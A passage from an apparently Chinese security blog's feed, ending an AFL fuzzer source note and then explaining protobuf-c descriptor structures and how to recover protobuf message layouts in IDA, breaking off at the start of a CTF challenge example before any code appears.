class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br></pre></td></tr></table></figure><p>fork一个子进程执行<code>as --64 -o /home/cyberangel/Desktop/test/exec_obj.o /tmp/.afl-27115-1673249415.s</code>命令</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>部分样例以及阅读过程中的参考来自于<a href="https://www.yuque.com/cyberangel">https://www.yuque.com/cyberangel</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;basic block(基本块)、edge(边)、代码覆盖率&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;edge就被用</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>protobuf初探</title>
    <link href="http://s1nec-1o.github.io/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/"/>
    <id>http://s1nec-1o.github.io/2025/05/13/protobuf%E5%88%9D%E6%8E%A2/</id>
    <published>2025-05-13T12:35:17.000Z</published>
    <updated>2025-05-13T12:39:32.290Z</updated>
    
    <content type="html"><![CDATA[<p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于<strong>将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构</strong>。所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先定义一个.proto文件</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span>&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据要通过c或者python来使用，来使用相应的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">protoc --c_out=. test.proto</span><br><span class="line">protoc --python_out=. test.proto</span><br></pre></td></tr></table></figure><p>c_out会生成一个<code>test.pb-c.c</code>和<code>test.pb-c.h</code>文件</p><p>python_out会生成一个<code>test_pb2.py</code>文件</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Devicemsg *</span><br><span class="line">       <span class="title function_">devicemsg__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Devicemsg *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;devicemsg__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的是一个Devicemsg指针，三个参数：</p><ul><li>allocator一般置0即可</li><li>len是长度，通过<code>devicemsg__get_packed_size</code>获取即可</li><li>data就是指向序列化的字节流</li></ul><p>可以发现<code>devicemsg_unpack</code>就是<code>protobuf_c_message_unpack</code>的封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor devicemsg__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Devicemsg&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Devicemsg),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  devicemsg__field_descriptors,</span><br><span class="line">  devicemsg__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  devicemsg__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) devicemsg__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体的定义在源码中是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>magic，一般为0x28AAEEF9</li><li>n_fields，是原本的massage有多少参数</li><li>fields，这个指向message内所有参数类型组成的一个数组，可以借此逆向分析message结构。</li></ol><p>如果需要具体分析一个结构体的组成,只需要关注<code>n_fields</code>与<code>fields</code></p><p>在本例中这样定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor devicemsg__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;actionid&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, actionid),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgidx&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgidx),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgsize&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgsize),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;msgcontent&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Devicemsg, msgcontent),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>name，名字，变量名</li><li>id，序号，即在message结构体中的顺序（等价于位置）</li><li>label，前面标记的required等标记</li><li>type，数据类型，string还是int64等</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"> PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line"> PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line"> PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line"> PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line"> PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line"> PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line"> PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line"> PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>貌似是0-0Ah顺序的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"> <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line"> PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">  * more than one).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">  * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">  * preserved.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">  * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br></pre></td></tr></table></figure><h2 id="ida结构体"><a href="#ida结构体" class="headerlink" title="ida结构体"></a>ida结构体</h2><p>为了方便在ida中查看相关结构体,可以将上述的两个结构体插入ida,当然需要处理一些不相关的数据</p><p><strong><code>ProtobufCMessageDescriptor</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> magic;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *short_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *c_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *package_name;</span><br><span class="line">  <span class="type">size_t</span> sizeof_message;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_fields;</span><br><span class="line">  <span class="type">const</span> ProtobufCFieldDescriptor *fields;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *fields_sorted_by_name;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_field_ranges;</span><br><span class="line">  <span class="type">char</span> *field_ranges;</span><br><span class="line">  __int64 message_init;</span><br><span class="line">  <span class="type">void</span> *reserved1;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>ProtobufCFieldDescriptor</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">uint32_t</span> id;</span><br><span class="line">  <span class="type">int</span> label;</span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> quantifier_offset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *descriptor;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *default_value;</span><br><span class="line">  <span class="type">uint32_t</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> reserved_flags;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述这两个结构体可以直接导入ida，然后通过unpack来寻找即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessage</span> &#123;</span></span><br><span class="line"><span class="comment">/** The descriptor for this message type. */</span></span><br><span class="line"><span class="type">void</span>*descriptor;</span><br><span class="line"><span class="comment">/** The number of elements in `unknown_fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_unknown_fields;</span><br><span class="line"><span class="comment">/** The fields that weren&#x27;t recognized by the parser. */</span></span><br><span class="line"><span class="type">void</span>*unknown_fields;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCBinaryData</span> &#123;</span></span><br><span class="line"><span class="type">size_t</span>len;        <span class="comment">/**&lt; Number of bytes in the `data` field. */</span></span><br><span class="line"><span class="type">uint8_t</span>*data;      <span class="comment">/**&lt; Data bytes. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Devicemsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int64_t</span> giaoid;</span><br><span class="line">  <span class="type">int64_t</span> giaosize;</span><br><span class="line">  ProtobufCBinaryData giaocontent;</span><br><span class="line">  ProtobufCBinaryData giaotoken;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个<code>_Devicemsg</code>要通过<code>proto -c_out=. xxx.proto</code>有一个.h文件，其中就可以找到对应的定义，然后unpack的返回值就是这个结构体了</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2025ccb决赛-orw"><a href="#2025ccb决赛-orw" class="headerlink" title="2025ccb决赛_orw"></a>2025ccb决赛_orw</h3><p>有花指令，简单去花：首先把一些恒真的指令给置为jmp，再把一些间接跳转换成直接跳转，然后再把main函数给<code>create function</code></p><blockquote><p>edit-&gt;function-&gt;create function</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 